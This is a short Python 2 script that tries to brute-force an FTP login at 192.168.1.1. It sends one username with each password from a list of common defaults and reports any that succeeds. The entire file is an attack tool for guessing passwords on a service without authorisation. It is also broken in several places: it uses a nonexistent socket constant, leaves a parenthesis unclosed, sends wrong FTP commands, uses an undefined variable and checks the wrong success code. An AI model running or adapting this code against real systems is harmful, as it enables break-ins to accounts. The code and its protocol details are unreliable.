#! /usr/bin/python

import socket
import re
import sys

def connect(usr, pwd):
  soc = socket.socket(socket.AF_NET, socket.SOCK_STREAM)
  print "[*] Testing " + usr + ": " + pwd
  
  soc.connect(('192.168.1.1', 21)
  data = soc.recv(1024)
  
  soc.send('USR' + usr + '\r\n')
  data = soc.recv(1024)
  
  soc.send('PW ' + pwd + '\r\n')
  data = soc.recv(3)
  
  soc.send("QUIT\r\n")
  soc.close()
  return data

usrNme = "Default"
pws = ["ABC123", "123456", "toor", "root", "testPw"]

for pwd in pws:
  tryPws = connect(usr, pwd)
  if tryPws == "100":
    print "[*] PWD Found: " + pwd
    sys.exit(0)
